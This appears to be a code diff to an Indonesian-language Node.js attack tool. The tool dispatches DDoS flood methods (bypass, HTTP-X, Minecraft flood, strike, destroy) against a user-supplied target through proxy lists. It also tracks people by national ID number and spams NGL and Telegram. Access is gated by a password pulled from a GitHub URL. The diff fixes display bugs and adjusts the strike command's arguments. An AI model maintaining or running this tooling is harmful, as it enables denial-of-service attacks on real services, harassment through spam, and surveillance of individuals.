@@ -76,7 +76,7 @@ async function checkAuth() {
         const res = await axios.get("https://raw.githubusercontent.com/deemzet999/repoG0R3mthdsoSss/refs/heads/main/irwan.txt");
         const pass = res.data.trim();
         const ask = () => {
-            process.stdout.write(`${" [ ".red}${"KUKIS-AUTH".white}${" ] ".red}${"Masukin password: ".yellow}`);
+            console.log(`${" [ ".red}${"KUKIS-AUTH".white}${" ] ".red}${"Masukin password: ".yellow}`);
             rl.question('', (input) => {
                 if (input === pass) {
                     console.log(" [!] Akses Diterima, Bantai Semua!".green);
@@ -119,7 +119,6 @@ function handleCmd() {
             case 'attack': attackExec(args[1], args[2], args[3], args[4], args[5]); break;
             case 'mc-attack': attackExec(args[1], 'mc-flood', args[3], null, null, args[2]); break;
             case 'track': osintExec(args[1], args[2]); break;
-            case 'sattack': attackExec(args[1], 'strike', args[2]); break;
             case 'sngl': spamNGL(args[1], args[2], args[3]); break;
             case 'tspam': spamTele(args[1], args[2], args[3], args[4]); break;
             case 'menu': mainMenu(); break;
@@ -163,9 +162,9 @@ function osintMenu() {
 function attackExec(target, method, time, rate=100, thread=10, port=80) {
     const PENDINGDDOS =  `
 ╭─────❒  DDOS STARTING... 
-│ Target  : ${'${target}'.red}
-│ Methods : ${'${method}'.red}
-| Time    : ${'${time}'.red}
+│ Target  : ${target.red}
+│ Methods : ${method.red}
+| Time    : ${time.red}
 │ Note    : ${'Jangan lupa jeda biar vps ga meledakkkkk'.magenta}
 └──────────❒`
     
@@ -174,7 +173,7 @@ function attackExec(target, method, time, rate=100, thread=10, port=80) {
         case 'bypass': command = `node assets/Methods/bypass.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
         case 'http-x': command = `node assets/Methods/HTTP-X.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
         case 'mc-flood': command = `node assets/Methods/mc-flood.js ${target} ${port} ${time}`; break;
-        case 'strike': command = `node assets/Methods/strike.js ${target} ${time}`; break;
+        case 'strike': command = `node assets/Methods/strike.js POST ${target} ${time} ${thread} ${rate}`; break;
         case 'destroy': command = `node assets/Methods/destroy.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
         case 'flood': command = `node assets/Methods/flood.js ${target} ${time}`; break;
         default: console.log("Method Salah, Kontol!".red); handleCmd(); return;
@@ -364,9 +363,9 @@ async function trackNIK(target) {
 async function spamNGL(target, message, count) {
     const PENDINGNGL = `
 ╭─────❒  SPAMNGL STARTING... 
-│ Target  : ${'${target}'.red}
-│ Count   : ${'${count}'.red}
-| Time    : ${'${time}'.red}
+│ Target  : ${target.red}
+│ Count   : ${count.red}
+| Time    : ${'100ms'.red}
 │ Note    : ${'Masukan Teks...'.magenta}
 └──────────❒`
     console.clear();
@@ -385,10 +384,10 @@ async function spamNGL(target, message, count) {
 async function spamTele(token, id, message, count) {
     const PENDINGTELE = `
 ╭─────❒  SPAMTELE STARTING... 
-│ Target  : ${'${token}'.red}
-│ ID      : ${'${id}'.red}
-│ Count   : ${'${count}'.red}
-| Time    : ${'${time}'.red}
+│ Target  : ${token.red}
+│ ID      : ${id.red}
+│ Count   : ${count.red}
+| Time    : ${'100ms'.red}
 │ Note    : ${'Masukan Teks...'.magenta}
 └──────────❒`
 
